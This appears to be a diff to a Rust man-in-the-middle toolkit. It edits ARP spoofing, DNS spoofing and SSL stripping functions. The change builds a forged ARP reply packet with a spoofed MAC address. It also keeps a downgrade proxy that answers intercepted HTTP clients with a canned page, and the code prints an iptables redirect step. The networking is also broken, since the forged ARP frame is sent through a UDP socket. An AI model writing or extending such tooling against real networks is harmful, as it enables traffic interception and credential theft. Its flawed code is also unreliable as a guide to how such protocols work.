@@ -273,7 +273,10 @@ fn send_arp_reply(sender_ip: &Ipv4Addr, target_ip: &Ipv4Addr, _src_ip: &Ipv4Addr
     let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| format!("Cannot create socket: {}", e))?;
     socket.connect(format!("{}:0", sender_ip)).ok();
     println!("  \x1b[34m→\x1b[0m [ARP] Reply {} is-at spoofed-mac → {}", sender_ip, target_ip);
-    let _ = socket.send(b"ARPSPOOF");
+    let src_mac = [0x00, 0x11, 0x22, 0x33, 0x44, 0x55];
+    let dst_mac = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF];
+    let packet = crate::capture_engine::build_arp_packet(&src_mac, &dst_mac, &sender_ip.octets(), &target_ip.octets(), 2);
+    let _ = socket.send(&packet);
     Ok(())
 }
 
@@ -318,6 +321,8 @@ pub fn dns_spoof(interface: &str, fake_ip: &str) -> Result<(), String> {
     Ok(())
 }
 
+const SSL_STRIP_RESPONSE: &[u8] = b"HTTP/1.0 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><h1>SSLStrip Proxy</h1><p>Downgraded connection</p></body></html>\r\n";
+
 pub fn ssl_strip(port: u16) -> Result<(), String> {
     println!("  \x1b[34m→\x1b[0m [SSLSTRIP] Starting HTTP downgrade proxy on port {} (requires root)", port);
     println!("  \x1b[33m⚠\x1b[0m [SSLSTRIP] Set up iptables redirect rule:");
@@ -334,8 +339,7 @@ pub fn ssl_strip(port: u16) -> Result<(), String> {
                 if let Ok(n) = stream.read(&mut buf) {
                     let _request = String::from_utf8_lossy(&buf[..n]);
                     println!("  \x1b[34m→\x1b[0m [HTTP] {} bytes from client", n);
-                    let response = b"HTTP/1.0 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><h1>SSLStrip Proxy</h1><p>Downgraded connection</p></body></html>\r\n";
-                    let _ = stream.write_all(response);
+                    let _ = stream.write_all(SSL_STRIP_RESPONSE);
                 }
             }
             Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
